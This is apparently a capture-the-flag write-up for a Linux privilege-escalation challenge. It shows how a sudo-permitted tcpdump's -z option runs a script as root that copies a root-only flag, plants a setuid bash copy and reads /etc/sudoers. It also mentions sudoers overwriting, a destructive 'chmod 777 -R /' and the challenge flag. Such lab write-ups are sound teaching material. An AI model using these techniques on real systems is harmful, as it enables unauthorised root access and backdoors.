# [HV22.12] Funny SysAdmin

<table>
  <tr>
    <th>Categories</th>
    <td>Linux</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>wangibangi</td>
  </tr>
</table>

## Description
Santa wrote his first small script, to track the open gifts on the wishlist. However the script stopped working a couple of days ago and Santa has been stuck debugging the script. His sysadmin seems to be a bit funny ;)

### Goal
Can you find the secret flag on the box?

Start the resources in the Resources section to find out!


## Solution

- The .ash_history revealed that user `santa` was able to run tcpdump.
- Privilege escalation with tcpdump: `sudo tcpdump -n -i any -G 1 -z ./doit.sh -w out.pcap` ([source](https://insinuator.net/2019/07/how-to-break-out-of-restricted-shells-with-tcpdump/)).
- The `find` binary was replaced with a dummy script.
- Let's use `busybox` directly: `/bin/busybox find / > /home/santa/find.out`
- Grep the file for "flag" and find `/root/secret/flag.txt`
- Copy that file over to `/home/santa` and change permissions.
- Profit.

All of these steps were done through the following script that I adjusted as we went on and re-ran it in a privileged context as root via tcpdump.

```
cat > doit.sh <<EOF
#!/usr/bin/env bash
id
cp /root/secret/flag.txt /home/santa/flag.txt
chmod +r /home/santa/flag.txt
/bin/busybox find / > /home/santa/find.out

chmod +r /var/log/wishlist.log
cp /bin/bash /home/santa/bash
chmod u+s /home/santa/bash
cat /etc/sudoers
#ls -al cat /etc/sudoers.d/
#cat /etc/sudoers.d/*
#cat >/etc/sudoers <<EOFF
#santa   ALL=(ALL:ALL) ALL
#EOFF
# cat /var/log/wishlist.log | tee ./out.log
EOF

# Make the script executable.
chmod +x doit.sh

# Invoke the script.
sudo tcpdump -n -i any -G 1 -z ./doit.sh -w out.pcap
```

## Other approaches
Other approaches would have involved:

- Check allowed sudo commands with `sudo -l`.
- Use `sudo less` to dump file contents readable by root.
    - Inside `less`, one can open (examine) another file via `:e <file>` and save contents from the current file to another file via `:s <otherfile>`.
    - With this, contents of `/etc/sudoers` could have been overwritten.
    - Conclude with `sudo -i` (to get a root shell using santa's password taken from the environment)
- A rather brute-force approach: Run `chmod 777 -R /` as root within the script run via tcpdump.

## Links
- https://gtfobins.github.io/gtfobins/tcpdump/

## Flag
```
HV22{M4k3-M3-a-S4ndW1ch}
```
